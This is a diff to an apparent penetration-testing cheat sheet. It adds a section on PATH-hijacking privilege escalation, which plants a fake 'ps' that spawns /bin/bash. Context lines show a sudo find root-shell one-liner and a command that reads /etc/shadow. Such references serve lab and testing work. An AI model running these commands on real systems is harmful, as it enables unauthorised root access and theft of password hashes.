@@ -278,6 +278,18 @@ to answer as its request, e.g.: pwncat, netcat, ncat or similar.
   - `sudo -l`: See which commands the user can execute as sudo.
   - `sudo find . -exec /bin/sh \; -quit`: Opens a root shell, if user is sudoer.
 
+## PATH Manipulation for Privesc
+By modifying the PATH variable, you can trick a system into executing your custom binaries instead of system binaries with elevated privileges.
+-  `echo $PATH` to check the directories. If any are writable, you can place a malicious executable (e.g., ps) in that directory.
+- `echo "/bin/bash" > /tmp/ps` + `chmod +x /tmp/ps`: Create a custom executable named `ps`
+  - This replaces the typical ps command with a Bash shell, allowing you to escalate privileges when ps is called.
+- `export PATH=/tmp:$PATH`: Modify the `PATH` variable
+  - This ensures the system checks `/tmp` for executables before looking in standard directories.
+- Trigger the vulnerable process. Execute a script or binary that runs the ps command. If the process is run with 
+elevated privileges (e.g., root), your custom `ps` will be executed, granting a root shell.
+- By adjusting the PATH, you can redirect common system commands to your own malicious versions, allowing for privilege 
+escalation when those commands are invoked with higher permissions.
+
 ## Base64
 - `base64 /etc/shadow | base64 -d`: coded and decoded shadow
 
